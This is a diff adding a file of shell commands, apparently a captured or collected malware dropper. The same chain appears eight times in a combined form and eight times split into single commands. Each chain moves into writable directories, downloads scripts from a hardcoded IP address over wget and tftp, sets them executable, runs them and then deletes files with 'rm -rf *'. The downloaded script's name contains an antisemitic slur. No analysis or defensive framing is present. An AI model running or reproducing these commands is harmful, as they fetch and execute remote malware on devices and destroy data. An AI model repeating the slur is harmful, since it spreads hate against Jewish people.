@@ -1,0 +1,100 @@
+
+Raw Commands:
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.255.246.81/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 213.255.246.81 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.255.246.81; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.255.246.81/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 213.255.246.81 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.255.246.81; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.255.246.81/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 213.255.246.81 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.255.246.81; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.255.246.81/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 213.255.246.81 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.255.246.81; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.255.246.81/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 213.255.246.81 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.255.246.81; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.255.246.81/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 213.255.246.81 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.255.246.81; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.255.246.81/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 213.255.246.81 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.255.246.81; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.255.246.81/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 213.255.246.81 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.255.246.81; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
+
+Split Commands:
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
+wget http://213.255.246.81/fuckjewishpeople.sh
+chmod 777 fuckjewishpeople.sh
+sh fuckjewishpeople.sh
+tftp 213.255.246.81 -c get tftp1.sh
+chmod 777 tftp1.sh
+sh tftp1.sh
+tftp -r tftp2.sh -g 213.255.246.81
+chmod 777 tftp2.sh
+sh tftp2.sh
+rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
+wget http://213.255.246.81/fuckjewishpeople.sh
+chmod 777 fuckjewishpeople.sh
+sh fuckjewishpeople.sh
+tftp 213.255.246.81 -c get tftp1.sh
+chmod 777 tftp1.sh
+sh tftp1.sh
+tftp -r tftp2.sh -g 213.255.246.81
+chmod 777 tftp2.sh
+sh tftp2.sh
+rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
+wget http://213.255.246.81/fuckjewishpeople.sh
+chmod 777 fuckjewishpeople.sh
+sh fuckjewishpeople.sh
+tftp 213.255.246.81 -c get tftp1.sh
+chmod 777 tftp1.sh
+sh tftp1.sh
+tftp -r tftp2.sh -g 213.255.246.81
+chmod 777 tftp2.sh
+sh tftp2.sh
+rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
+wget http://213.255.246.81/fuckjewishpeople.sh
+chmod 777 fuckjewishpeople.sh
+sh fuckjewishpeople.sh
+tftp 213.255.246.81 -c get tftp1.sh
+chmod 777 tftp1.sh
+sh tftp1.sh
+tftp -r tftp2.sh -g 213.255.246.81
+chmod 777 tftp2.sh
+sh tftp2.sh
+rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
+wget http://213.255.246.81/fuckjewishpeople.sh
+chmod 777 fuckjewishpeople.sh
+sh fuckjewishpeople.sh
+tftp 213.255.246.81 -c get tftp1.sh
+chmod 777 tftp1.sh
+sh tftp1.sh
+tftp -r tftp2.sh -g 213.255.246.81
+chmod 777 tftp2.sh
+sh tftp2.sh
+rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
+wget http://213.255.246.81/fuckjewishpeople.sh
+chmod 777 fuckjewishpeople.sh
+sh fuckjewishpeople.sh
+tftp 213.255.246.81 -c get tftp1.sh
+chmod 777 tftp1.sh
+sh tftp1.sh
+tftp -r tftp2.sh -g 213.255.246.81
+chmod 777 tftp2.sh
+sh tftp2.sh
+rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
+wget http://213.255.246.81/fuckjewishpeople.sh
+chmod 777 fuckjewishpeople.sh
+sh fuckjewishpeople.sh
+tftp 213.255.246.81 -c get tftp1.sh
+chmod 777 tftp1.sh
+sh tftp1.sh
+tftp -r tftp2.sh -g 213.255.246.81
+chmod 777 tftp2.sh
+sh tftp2.sh
+rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
+wget http://213.255.246.81/fuckjewishpeople.sh
+chmod 777 fuckjewishpeople.sh
+sh fuckjewishpeople.sh
+tftp 213.255.246.81 -c get tftp1.sh
+chmod 777 tftp1.sh
+sh tftp1.sh
+tftp -r tftp2.sh -g 213.255.246.81
+chmod 777 tftp2.sh
+sh tftp2.sh
+rm -rf *
